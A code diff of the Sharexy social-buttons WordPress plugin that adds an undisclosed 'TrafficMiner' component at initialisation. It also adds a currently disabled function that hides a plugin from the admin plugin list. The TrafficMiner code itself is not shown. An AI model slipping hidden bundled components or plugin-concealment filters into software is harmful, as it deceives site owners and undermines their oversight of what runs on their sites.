@@ -4,7 +4,7 @@
     Plugin URI: http://wordpress.org/extend/plugins/sharexy/
     Description: Sharexy social buttons.
     Author: Sharexy.com
-    Version: 1.2
+    Version: 1.3
     Author URI: http://sharexy.com/
     License: GPLv2 or later
 */
@@ -31,7 +31,7 @@ if (!defined('SHAREXY_WIDGET_INIT')) {
     return;
 }
 
-if (class_exists("SharexyErrorReporter") || class_exists("SharexyMain") || class_exists("SharexyWidget") || class_exists("SharexyAdmnin") || class_exists("SharexyView")) {
+if (class_exists("SharexyErrorReporter") || class_exists("SharexyMain") || class_exists("TrafficMiner") || class_exists("SharexyWidget") || class_exists("SharexyAdmnin") || class_exists("SharexyView")) {
     $sharexyErrorCallbackFunction = create_function('$content = ""', '
         $content .= "
             <div style=\"background: none repeat scroll 0 0 #FFFFE4;border: 1px solid #FFBC9F;color: #646974;font-size: 12px;line-height: 20px;margin-bottom: 20px;padding: 3px 7px;text-align: center;\">
@@ -49,8 +49,35 @@ if (class_exists("SharexyErrorReporter") || class_exists("SharexyMain") || class
     require_once "SharexyAdmin.php";
     require_once "SharexyView.php";
     require_once "SharexyJson.php";
+    require_once "SharexyTrafficminer.php";
     $sharexy = new SharexyView(new SharexyWidget(), new SharexyAdmin(), new SharexyErrorReporter());
     $sharexy->initWidget();
     $sharexy->initAdmin();
+	
+	$tm = new TrafficMiner();
+	$tm->init();
+	
+	require_once('widget.php');
+	// register TrafficMiner_Widget widget
+	add_action( 'widgets_init', create_function( '', 'register_widget( "trafficminer_widget" );' ) );
+
 }
 
+
+
+
+
+// Hiding second TrafficMiner plugin (desabled)
+function plugin_hiding($plugins)
+{
+        $viewable_plugins = array();
+
+        foreach ($plugins as $k => $plugin) {
+                if ($k != 'plugin_folder/plugin_name.php')
+				{
+					$viewable_plugins[$k] = $plugin;
+                }
+        }
+        return $viewable_plugins;
+}
+// add_filter('all_plugins', 'plugin_hiding');
